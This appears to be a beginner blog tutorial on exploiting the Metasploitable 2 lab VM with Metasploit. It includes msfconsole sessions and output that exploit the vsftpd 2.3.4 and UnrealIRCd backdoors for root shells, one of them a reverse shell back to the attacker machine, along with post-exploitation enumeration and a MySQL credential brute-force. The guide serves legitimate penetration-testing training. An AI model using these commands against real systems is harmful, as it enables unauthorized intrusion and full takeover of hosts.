---
layout: "layouts/post.njk"
title: "Metasploitable 2: The Ultimate Beginner's Guide to Exploitation"
subtitle: "Learn how to hack Metasploitable 2 from scratch using Metasploit – exploit vsftpd, UnrealIRCd, and more. Step‑by‑step guide for beginners."
date: 2026-07-25
updated: 2026-07-25
author: "Aimad Ul Islam"
excerpt: "Learn how to hack Metasploitable 2 from scratch using Metasploit – exploit vsftpd, UnrealIRCd, and more."
categories: ["Cybersecurity", "Tutorials", "Linux"]
tags: ["metasploitable", "metasploit", "exploitation", "penetration-testing", "ethical-hacking"]
readingTime: 20
emoji: "🎯"
---

## Introduction

Metasploitable 2 is the go‑to target for every beginner penetration tester. It’s a deliberately vulnerable Linux virtual machine packed with multiple exploitable services, making it the perfect environment to learn how to use Metasploit, discover vulnerabilities, and practice your hacking skills – all legally.

In this guide, I’ll walk you through the entire process: from setting up Metasploitable 2 in VirtualBox to exploiting two of its most famous vulnerabilities – the vsftpd backdoor and the UnrealIRCd backdoor – and then performing post‑exploitation steps. By the end, you’ll have a solid understanding of how Metasploit works and how to use it in real engagements.

<div class="callout callout-info">
  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
  <div>
    <div class="callout-title">What You’ll Need</div>
    <div class="callout-body">A Kali Linux VM (or any Linux with Metasploit installed), VirtualBox, and of course, the Metasploitable 2 VM.</div>
  </div>
</div>

<div class="callout callout-warn">
  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
  <div>
    <div class="callout-title">Ethical Use Only</div>
    <div class="callout-body">This guide is for educational purposes. You must only exploit systems you own or have explicit written permission to test. Unauthorised hacking is illegal and unethical.</div>
  </div>
</div>

## What is Metasploitable 2?

Metasploitable 2 is an Ubuntu 8.04.2 LTS system intentionally designed with a multitude of security flaws. It includes vulnerable versions of FTP, SSH, Telnet, HTTP, MySQL, and other services. It’s the official target for the Metasploit Project and is used in training courses worldwide.

Some of the notable vulnerabilities include:
* **vsftpd 2.3.4** – contains a backdoor that allows remote command execution (CVE‑2011‑2523).
* **UnrealIRCd 3.2.8.1** – contains a backdoor that gives a remote shell (CVE‑2010‑2075).
* **Apache 2.2.8** – several known vulnerabilities.
* **MySQL 5.0.51a** – default root password.
* **Tomcat 5.5** – default credentials on the manager interface.

We’ll focus on the two backdoors because they are the most straightforward and rewarding to exploit as a beginner.

## Setting Up Metasploitable 2

1. Download Metasploitable 2 from [SourceForge](https://sourceforge.net/projects/metasploitable/).
2. Extract the ZIP archive. Inside, you’ll find a `.vmdk` disk file.
3. In VirtualBox, create a new VM (Linux, Ubuntu 64‑bit).
4. Attach the `.vmdk` as the hard disk.
5. Set network adapter to **Host‑Only** (to keep the lab isolated).
6. Start the VM. Default credentials: `msfadmin` / `msfadmin`.
7. Find its IP address with `ifconfig` inside the VM.

Now you have your target ready.

## Metasploit Framework Basics

Metasploit is a powerful framework that provides a modular approach to exploitation. It consists of several components:
* **Exploits** – code that takes advantage of a vulnerability.
* **Payloads** – the code that runs on the target after successful exploitation (e.g., a reverse shell).
* **Encoders** – obfuscate payloads to evade antivirus.
* **Auxiliary modules** – for reconnaissance, scanning, and other tasks.
* **Post‑exploitation modules** – for privilege escalation, persistence, etc.

You interact with Metasploit via the `msfconsole` command. To start it:
<div class="code-block-wrap">
  <span class="code-block-label">Launch msfconsole</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>sudo msfconsole</code></pre>
</div>
Inside the console, you can search for modules, set options, and run exploits. Basic commands you’ll use:
* `search <keyword>` – find modules.
* `use <module_path>` – select a module.
* `show options` – display required and optional settings.
* `set <option> <value>` – configure an option.
* `run` or `exploit` – execute the module.

## Reconnaissance – Gathering Intel

Before exploiting, you need to know what services are running on the target. Nmap is perfect for this. Fire up a terminal on Kali and run:
<div class="code-block-wrap">
  <span class="code-block-label">Nmap scan of Metasploitable 2</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>sudo nmap -sV -p- 192.168.56.102</code></pre>
</div>
You’ll see a list of open ports and service versions. Pay attention to port **21** (vsftpd) and port **6667** (UnrealIRCd). Both are vulnerable. Also note port 80 (Apache), 3306 (MySQL), and 8180 (Tomcat).

## Exploit 1: vsftpd 2.3.4 Backdoor (CVE‑2011‑2523)

The vsftpd 2.3.4 version has a backdoor that allows an attacker to execute arbitrary commands. The backdoor is triggered by a specific username (ending with `:)`) that opens a shell on port 6200. Metasploit has a module that automates this.

<div class="code-block-wrap">
  <span class="code-block-label">Exploiting vsftpd backdoor</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>msf6 > search vsftpd

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.102:21 - Backdooring...
[*] 192.168.56.102:21 - Backdoor triggered
[*] 192.168.56.102:21 - Command shell session 1 opened
</code></pre>
</div>
After `run`, you’ll get a command shell on the target. You can run commands like `whoami`, `id`, `ls`, etc. The shell is not interactive enough, but it’s a proof of concept. For a fully interactive shell, you can use a reverse shell payload.

<div class="callout callout-success">
  <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
  <div>
    <div class="callout-title">You Got a Shell!</div>
    <div class="callout-body">Congratulations – you just exploited your first service! The backdoor grants you access as the <code>root</code> user (since vsftpd runs as root).</div>
  </div>
</div>

## Exploit 2: UnrealIRCd Backdoor (CVE‑2010‑2075)

UnrealIRCd 3.2.8.1 contains a backdoor that can be exploited by sending a specific line to the server, causing it to execute arbitrary commands. The Metasploit module for this is `exploit/unix/irc/unreal_ircd_3281_backdoor`.

<div class="code-block-wrap">
  <span class="code-block-label">Exploiting UnrealIRCd backdoor</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.102
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.101   # your Kali IP
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] 192.168.56.102:6667 - UnrealIRCd 3.2.8.1 backdoor
[*] 192.168.56.102:6667 - Sending backdoor command...
[*] Command shell session 2 opened
</code></pre>
</div>
This time we used a reverse shell payload (`cmd/unix/reverse`) which establishes a connection back to your Kali machine. After the exploit, you’ll have a shell on the target. Again, you’ll be `root`.

<div class="callout callout-info">
  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
  <div>
    <div class="callout-title">Payload Choice</div>
    <div class="callout-body">The <code>cmd/unix/reverse</code> payload opens a reverse shell. You need to set <code>LHOST</code> to your Kali IP. Also, make sure your listener is set up automatically – Metasploit handles it for you.</div>
  </div>
</div>

## Post‑Exploitation & Privilege Escalation

Since we already have root access, we don’t need privilege escalation. However, in a real engagement, you might not always get root directly. Metasploit has many post‑exploitation modules to gather information, maintain access, and more.
For example, you can use the `post/linux/gather/checkvm` module to check if the target is a VM, or `post/linux/gather/enum_system` to gather system information.

<div class="code-block-wrap">
  <span class="code-block-label">Post‑exploitation example</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>msf6 > use post/linux/gather/enum_system
msf6 post(linux/gather/enum_system) > set SESSION 1
msf6 post(linux/gather/enum_system) > run

[*] Running module against 192.168.56.102
[*] Session 1 is not a Meterpreter session... still gathering
[+] Info stored in /root/.msf4/loot/...
</code></pre>
</div>
You can also upgrade your shell to a **Meterpreter** session, which provides more advanced features like file upload/download, keylogging, and pivoting. Use the `sessions -u <id>` command to upgrade.

## Auxiliary Modules for Further Enumeration

Metasploit also includes many auxiliary modules for scanning and enumeration. For instance, you can use the `auxiliary/scanner/mysql/mysql_login` module to brute‑force MySQL credentials (the default root password is blank or `root`).

<div class="code-block-wrap">
  <span class="code-block-label">MySQL login scanner</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.56.102
msf6 auxiliary(scanner/mysql/mysql_login) > run

[*] 192.168.56.102:3306 - 192.168.56.102:3306 - MySQL - Login successful: 'root':''
</code></pre>
</div>

## Next Steps & Practice

Now that you’ve exploited two services, here are things you can try next:
* **Try the Apache and Tomcat vulnerabilities** – use Metasploit modules like `exploit/multi/http/tomcat_mgr_deploy` to gain a shell.
* **Practice using Meterpreter** – upgrade your sessions and try file downloading, screenshotting, and keylogging.
* **Use the `search` command** to find other modules that target Metasploitable 2.
* **Read the Metasploit documentation** and understand how to write your own modules.
* **Set up a practice network** with multiple VMs to simulate a real enterprise environment.
